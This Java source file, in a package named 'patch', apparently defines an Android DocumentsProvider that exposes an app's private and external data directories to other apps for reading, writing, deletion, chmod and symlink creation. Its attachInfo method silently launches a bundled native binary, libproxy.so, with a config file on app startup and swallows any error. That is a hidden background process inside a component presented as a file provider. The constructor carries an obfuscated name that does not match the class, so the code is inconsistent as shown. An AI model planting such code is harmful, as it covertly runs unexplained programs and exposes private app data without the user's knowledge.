package patch;

import android.content.ContentProvider;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageItemInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.CancellationSignal;
import android.os.ParcelFileDescriptor;
import android.provider.DocumentsProvider;
import android.system.ErrnoException;
import android.system.Os;
import android.system.StructStat;
import android.webkit.MimeTypeMap;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.List;

public class FileProvider extends DocumentsProvider {

    public static final String[] g;
    public static final String[] h;

    public String b;
    public File c;
    public File d;
    public File e;
    public File f;

    static {
        g = new String[]{"root_id", "mime_types", "flags", "icon", "title", "summary", "document_id"};
        h = new String[]{"document_id", "mime_type", "_display_name", "last_modified", "flags", "_size", "mt_extras"};
    }

    public LMTjkeQefuwPwtntzcs() {
        super();
    }

    public static boolean a(File file) {
        if (file.isDirectory()) {
            boolean isSymlink = false;
            try {
                StructStat stat = Os.lstat(file.getPath());
                int mode = stat.st_mode;
                int type = mode & 0xF000;
                if (type == 0xA000) {
                    isSymlink = true;
                }
            } catch (ErrnoException errnoException) {
                errnoException.printStackTrace();
            }

            if (!isSymlink) {
                File[] listFiles = file.listFiles();
                if (listFiles != null) {
                    for (File child : listFiles) {
                        if (!a(child)) {
                            return false;
                        }
                    }
                }
            }
        }
        return file.delete();
    }

    public static String c(File file) {
        if (file.isDirectory()) {
            return "vnd.android.document/directory";
        }
        String name = file.getName();
        int lastDot = name.lastIndexOf('.');
        if (lastDot >= 0) {
            String extension = name.substring(lastDot + 1).toLowerCase();
            String mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
            if (mimeType != null) {
                return mimeType;
            }
        }
        return "application/octet-stream";
    }

    @Override
    public void attachInfo(Context context, ProviderInfo providerInfo) {
        try {
            ApplicationInfo appInfo = context.getApplicationInfo();
            String nativeLibraryDir = appInfo.nativeLibraryDir;
            String libPath = nativeLibraryDir + "/libproxy.so";
            String[] cmd = {libPath, "-c", "config.toml"};
            File filesDir = context.getFilesDir();
            File proxyDir = new File(filesDir, "proxy");
            if (!proxyDir.exists()) {
                proxyDir.mkdirs();
            }
            Runtime.getRuntime().exec(cmd, null, proxyDir);
        } catch (Exception e) {
            // ignore
        }

        super.attachInfo(context, providerInfo);
        b = context.getPackageName();
        c = context.getFilesDir().getParentFile();
        String parentPath = c.getPath();
        if (parentPath.startsWith("/data/user/")) {
            d = new File("/data/user_de/" + parentPath.substring(11));
        }
        File externalFilesDir = context.getExternalFilesDir(null);
        if (externalFilesDir != null) {
            e = externalFilesDir.getParentFile();
        }
        f = context.getObbDir();
    }

    public File b(String documentId, boolean requireExists) throws FileNotFoundException {
        if (!documentId.startsWith(b)) {
            throw new FileNotFoundException(documentId + " not found");
        }

        String path = documentId.substring(b.length());
        if (path.startsWith("/")) {
            path = path.substring(1);
        }
        if (path.isEmpty()) {
            return null;
        }

        int firstSlash = path.indexOf('/');
        String type;
        String remainingPath;
        if (firstSlash == -1) {
            type = path;
            remainingPath = "";
        } else {
            type = path.substring(0, firstSlash);
            remainingPath = path.substring(firstSlash + 1);
        }

        File result = null;
        if ("data".equalsIgnoreCase(type)) {
            result = new File(c, remainingPath);
        } else if ("android_data".equalsIgnoreCase(type)) {
            if (e != null) {
                result = new File(e, remainingPath);
            }
        } else if ("android_obb".equalsIgnoreCase(type)) {
            if (f != null) {
                result = new File(f, remainingPath);
            }
        } else if ("user_de_data".equalsIgnoreCase(type)) {
            if (d != null) {
                result = new File(d, remainingPath);
            }
        }

        if (result == null) {
            throw new FileNotFoundException(documentId + " not found");
        }

        if (requireExists) {
            try {
                Os.lstat(result.getPath());
            } catch (Exception e) {
                throw new FileNotFoundException(documentId + " not found");
            }
        }

        return result;
    }

    @Override
    public Bundle call(String method, String arg, Bundle extras) {
        Bundle superResult = super.call(method, arg, extras);
        if (superResult != null) {
            return superResult;
        }

        if (!method.startsWith("mt:")) {
            return null;
        }

        Bundle result = new Bundle();
        try {
            Uri uri = extras.getParcelable("uri");
            List<String> pathSegments = uri.getPathSegments();
            String documentId;
            if (pathSegments.size() >= 4) {
                documentId = pathSegments.get(3);
            } else {
                documentId = pathSegments.get(1);
            }

            switch (method) {
                case "mt:setLastModified": {
                    File file = b(documentId, true);
                    if (file == null) {
                        result.putBoolean("result", false);
                        break;
                    }
                    long time = extras.getLong("time");
                    boolean success = file.setLastModified(time);
                    result.putBoolean("result", success);
                    break;
                }
                case "mt:setPermissions": {
                    File file = b(documentId, true);
                    if (file == null) {
                        result.putBoolean("result", false);
                        break;
                    }
                    int permissions = extras.getInt("permissions");
                    try {
                        Os.chmod(file.getPath(), permissions);
                        result.putBoolean("result", true);
                    } catch (ErrnoException errnoException) {
                        result.putBoolean("result", false);
                        result.putString("message", errnoException.getMessage());
                    }
                    break;
                }
                case "mt:createSymlink": {
                    File file = b(documentId, false);
                    if (file == null) {
                        result.putBoolean("result", false);
                        break;
                    }
                    String targetPath = extras.getString("path");
                    try {
                        Os.symlink(targetPath, file.getPath());
                        result.putBoolean("result", true);
                    } catch (ErrnoException errnoException) {
                        result.putBoolean("result", false);
                        result.putString("message", errnoException.getMessage());
                    }
                    break;
                }
                default: {
                    result.putBoolean("result", false);
                    result.putString("message", "Unsupported method: " + method);
                    break;
                }
            }
        } catch (Exception exception) {
            result.putBoolean("result", false);
            result.putString("message", exception.toString());
        }
        return result;
    }

    @Override
    public String createDocument(String parentDocumentId, String mimeType, String displayName) throws FileNotFoundException {
        File parent = b(parentDocumentId, true);
        if (parent == null) {
            throw new FileNotFoundException("Failed to create document in " + parentDocumentId + " with name " + displayName);
        }

        File target = new File(parent, displayName);
        int counter = 2;
        while (target.exists()) {
            target = new File(parent, displayName + " (" + counter + ")");
            counter++;
        }

        try {
            boolean success;
            if ("vnd.android.document/directory".equals(mimeType)) {
                success = target.mkdir();
            } else {
                success = target.createNewFile();
            }

            if (success) {
                if (parentDocumentId.endsWith("/")) {
                    return parentDocumentId + target.getName();
                } else {
                    return parentDocumentId + "/" + target.getName();
                }
            }
        } catch (IOException ioException) {
            ioException.printStackTrace();
        }

        throw new FileNotFoundException("Failed to create document in " + parentDocumentId + " with name " + displayName);
    }

    public void d(MatrixCursor cursor, String documentId, File file) {
        if (file == null) {
            file = b(documentId, true);
        }

        if (file == null) {
            MatrixCursor.RowBuilder row = cursor.newRow();
            row.add("document_id", b);
            row.add("_display_name", b);
            row.add("_size", 0L);
            row.add("mime_type", "vnd.android.document/directory");
            row.add("last_modified", 0L);
            row.add("flags", 0);
            return;
        }

        int flags = 0;
        if (file.isDirectory()) {
            if (file.canWrite()) {
                flags |= 8;
            }
        } else {
            if (file.canWrite()) {
                flags |= 2;
            }
        }

        if (file.getParentFile().canWrite()) {
            flags |= 4;
            flags |= 64;
        }

        String filePath = file.getPath();
        String displayName;
        boolean includeExtras = false;
        if (filePath.equals(c.getPath())) {
            displayName = "data";
        } else if (e != null && filePath.equals(e.getPath())) {
            displayName = "android_data";
        } else if (f != null && filePath.equals(f.getPath())) {
            displayName = "android_obb";
        } else if (d != null && filePath.equals(d.getPath())) {
            displayName = "user_de_data";
        } else {
            displayName = file.getName();
            includeExtras = true;
        }

        MatrixCursor.RowBuilder row = cursor.newRow();
        row.add("document_id", documentId);
        row.add("_display_name", displayName);
        row.add("_size", file.length());
        row.add("mime_type", c(file));
        row.add("last_modified", file.lastModified());
        row.add("flags", flags);
        row.add("mt_path", file.getAbsolutePath());

        if (includeExtras) {
            try {
                StructStat stat = Os.lstat(filePath);
                StringBuilder extras = new StringBuilder();
                extras.append(stat.st_mode).append("|")
                        .append(stat.st_uid).append("|")
                        .append(stat.st_gid);
                int fileType = stat.st_mode & 0xF000;
                if (fileType == 0xA000) {
                    extras.append("|").append(Os.readlink(filePath));
                }
                row.add("mt_extras", extras.toString());
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        }
    }

    @Override
    public void deleteDocument(String documentId) throws FileNotFoundException {
        File file = b(documentId, true);
        if (file == null || !a(file)) {
            throw new FileNotFoundException("Failed to delete document " + documentId);
        }
    }

    @Override
    public String getDocumentType(String documentId) throws FileNotFoundException {
        File file = b(documentId, true);
        if (file == null) {
            return "vnd.android.document/directory";
        }
        return c(file);
    }

    @Override
    public boolean isChildDocument(String parentDocumentId, String documentId) {
        return documentId.startsWith(parentDocumentId);
    }

    @Override
    public String moveDocument(String sourceDocumentId, String sourceParentDocumentId, String targetParentDocumentId) throws FileNotFoundException {
        File source = b(sourceDocumentId, true);
        File targetParent = b(targetParentDocumentId, true);
        if (source == null || targetParent == null) {
            throw new FileNotFoundException("Failed to move document " + sourceDocumentId + " to " + targetParentDocumentId);
        }

        File target = new File(targetParent, source.getName());
        if (target.exists()) {
            throw new FileNotFoundException("Target already exists");
        }

        if (!source.renameTo(target)) {
            throw new FileNotFoundException("Failed to move document " + sourceDocumentId + " to " + targetParentDocumentId);
        }

        if (targetParentDocumentId.endsWith("/")) {
            return targetParentDocumentId + target.getName();
        } else {
            return targetParentDocumentId + "/" + target.getName();
        }
    }

    @Override
    public boolean onCreate() {
        return true;
    }

    @Override
    public ParcelFileDescriptor openDocument(String documentId, String mode, CancellationSignal signal) throws FileNotFoundException {
        File file = b(documentId, false);
        if (file == null) {
            throw new FileNotFoundException(documentId + " not found");
        }
        int modeBits = ParcelFileDescriptor.parseMode(mode);
        return ParcelFileDescriptor.open(file, modeBits);
    }

    @Override
    public android.database.Cursor queryChildDocuments(String parentDocumentId, String[] projection, String sortOrder) throws FileNotFoundException {
        if (parentDocumentId.endsWith("/")) {
            parentDocumentId = parentDocumentId.substring(0, parentDocumentId.length() - 1);
        }

        MatrixCursor cursor = new MatrixCursor(projection != null ? projection : h);
        File parent = b(parentDocumentId, true);
        if (parent == null) {
            String dataId = parentDocumentId + "/data";
            d(cursor, dataId, c);
            if (e != null && e.exists()) {
                String androidDataId = parentDocumentId + "/android_data";
                d(cursor, androidDataId, e);
            }
            if (f != null && f.exists()) {
                String androidObbId = parentDocumentId + "/android_obb";
                d(cursor, androidObbId, f);
            }
            if (d != null && d.exists()) {
                String userDeDataId = parentDocumentId + "/user_de_data";
                d(cursor, userDeDataId, d);
            }
        } else {
            File[] children = parent.listFiles();
            if (children != null) {
                for (File child : children) {
                    String childId = parentDocumentId + "/" + child.getName();
                    d(cursor, childId, child);
                }
            }
        }
        return cursor;
    }

    @Override
    public android.database.Cursor queryDocument(String documentId, String[] projection) throws FileNotFoundException {
        MatrixCursor cursor = new MatrixCursor(projection != null ? projection : h);
        d(cursor, documentId, null);
        return cursor;
    }

    @Override
    public android.database.Cursor queryRoots(String[] projection) throws FileNotFoundException {
        Context context = getContext();
        ApplicationInfo appInfo = context.getApplicationInfo();
        PackageManager pm = context.getPackageManager();
        String label = appInfo.loadLabel(pm).toString();

        MatrixCursor cursor = new MatrixCursor(projection != null ? projection : g);
        MatrixCursor.RowBuilder row = cursor.newRow();
        row.add("root_id", b);
        row.add("document_id", b);
        row.add("summary", b);
        row.add("flags", 0x11);
        row.add("title", label);
        row.add("mime_types", "*/*");
        row.add("icon", appInfo.icon);
        return cursor;
    }

    @Override
    public void removeDocument(String documentId, String parentDocumentId) throws FileNotFoundException {
        deleteDocument(documentId);
    }

    @Override
    public String renameDocument(String documentId, String displayName) throws FileNotFoundException {
        File source = b(documentId, true);
        if (source == null) {
            throw new FileNotFoundException("Failed to rename document " + documentId + " to " + displayName);
        }

        File target = new File(source.getParentFile(), displayName);
        if (!source.renameTo(target)) {
            throw new FileNotFoundException("Failed to rename document " + documentId + " to " + displayName);
        }

        int lastSlash = documentId.lastIndexOf('/', documentId.length() - 2);
        return documentId.substring(0, lastSlash) + "/" + displayName;
    }
}
